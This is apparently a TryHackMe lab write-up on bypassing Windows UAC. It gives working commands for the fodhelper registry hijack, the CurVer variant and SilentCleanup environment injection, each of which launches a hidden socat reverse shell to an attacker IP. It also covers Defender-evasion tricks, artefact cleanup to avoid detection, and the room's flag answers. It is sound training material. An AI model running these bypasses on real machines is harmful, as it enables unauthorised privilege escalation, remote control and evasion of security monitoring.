# 6.4 - [Bypassing UAC](https://tryhackme.com/room/bypassinguac)

## 🔍 Overview
- User Account Control (UAC) is a Windows security feature that forces processes to run with non‑privileged tokens by default, even for administrators.
- Bypassing UAC is essential for attackers to gain full administrative privileges after obtaining a medium‑integrity shell.
- UAC is **not considered a security boundary** by Microsoft, so many bypass techniques remain unpatched.
- This room covers GUI‑based bypasses, auto‑elevating processes (fodhelper), scheduled task abuse, and evading Windows Defender.

---

## 🧠 UAC Fundamentals

### Integrity Levels (IL)
| Level | Use |
|-------|-----|
| **Low** | Internet‑facing processes (e.g., Internet Explorer) |
| **Medium** | Standard users and administrators’ **filtered** tokens |
| **High** | Administrators’ **elevated** tokens (if UAC enabled) |
| **System** | Reserved for OS use |

### Filtered Tokens
- **Non‑administrators**: single Medium IL token.
- **Administrators**: receive two tokens:
  - **Filtered token** (Medium IL) – used for regular operations.
  - **Elevated token** (High IL) – used for privileged tasks after UAC consent.

### UAC Settings
| Level | Behaviour |
|-------|-----------|
| Always notify | Prompt on all changes (secure desktop) |
| Notify only when programs make changes (default) | No prompt for Windows settings changes |
| Notify without dimming | Same, but no secure desktop |
| Never notify | No prompts; admins always High IL |

### Appinfo Service
- **Application Information Service** handles UAC elevation.
- Flow: `ShellExecute(runas)` → Appinfo → `consent.exe` prompt → elevation if approved.

### Auto‑Elevation
- Certain signed executables in trusted directories (e.g., `%SystemRoot%\System32`) can auto‑elevate via manifest `autoElevate` or registry settings.

**Task 1 & 2 Answers:**
- Highest IL available → `System`
- IL associated with administrator's elevated token → `high`
- Full name of UAC elevation service → `Application Information Service`

## 🖥️ Task 3: GUI‑Based Bypasses

### Case Study: `msconfig`
- `msconfig.exe` auto‑elevates (manifest has `<autoElevate>true</autoElevate>`).
- From the **Tools** tab, launch a command prompt → inherits High IL.
- **Flag:** `THM{UAC_HELLO_WORLD}`

### Case Study: `azman.msc`
- `azman.msc` (Authorization Manager) runs via `mmc.exe` with High IL.
- Open **Help** → right‑click → **View Source** → opens `notepad.exe` (High IL).
- In Notepad, **File → Open** → browse to `C:\Windows\System32\cmd.exe` → right‑click **Open** → spawns High IL shell.
- **Flag:** `THM{GUI_UAC_BYPASSED_AGAIN}`

## 🔄 Task 4: Auto‑Elevating Processes – `fodhelper`

### Technique Overview
- `fodhelper.exe` auto‑elevates and checks `HKEY_CLASSES_ROOT` for `ms-settings` ProgID.
- `HKCU\Software\Classes` overrides HKLM for user‑specific associations.
- By creating `HKCU\Software\Classes\ms-settings\Shell\Open\command`, we can inject our payload.

### Requirements
- Create an empty `DelegateExecute` value.
- Set the default command to our reverse shell.

### Commands
```cmd
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
fodhelper.exe
```

- **Flag:** `THM{AUTOELEVATE4THEWIN}`

### Cleanup
```cmd
reg delete HKCU\Software\Classes\ms-settings\ /f
```

## 🛡️ Task 5: Improving Fodhelper – Bypassing Windows Defender

### Race Condition
- Windows Defender may detect and delete the registry key immediately.
- Execute `fodhelper` in the same command line right after adding the key to win the race:
```cmd
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

### CurVer Variation (more stealthy)
- Instead of writing payload to `ms-settings\Shell\Open\command`, use `CurVer` to point to a custom ProgID.
- Create `HKCU\Software\Classes\.pwn\Shell\Open\command` with payload.
- Set `HKCU\Software\Classes\ms-settings\CurVer` default to `.pwn`.

### Example (CMD version)
```cmd
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe
```

- **Flag:** `THM{AV_UAC_BYPASS_4_ALL}`

### Cleanup
```cmd
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

## ⏰ Task 6: Scheduled Task – Disk Cleanup (Bypasses Always Notify)

### Technique
- Scheduled task `\Microsoft\Windows\DiskCleanup\SilentCleanup` runs with highest privileges and can be triggered by any user.
- It executes `%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`.
- We can override `%windir%` via `HKCU\Environment` to inject a command.

### Payload
```cmd
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

- `&REM ` comments out the rest of the command.
- **Flag:** `THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}`

### Cleanup
```cmd
reg delete "HKCU\Environment" /v "windir" /f
```

## 🔑 Key Takeaways
- UAC bypass relies on abusing auto‑elevating processes, scheduled tasks, and environment variable injection.
- Windows Defender can be evaded by modifying registry keys quickly (race condition) or using less‑detected variations (CurVer).
- Always clean registry artefacts to avoid detection.
- UAC is not a security boundary; many bypasses work even with default settings.
- Tools like UACME automate bypasses, but customisation improves evasion.
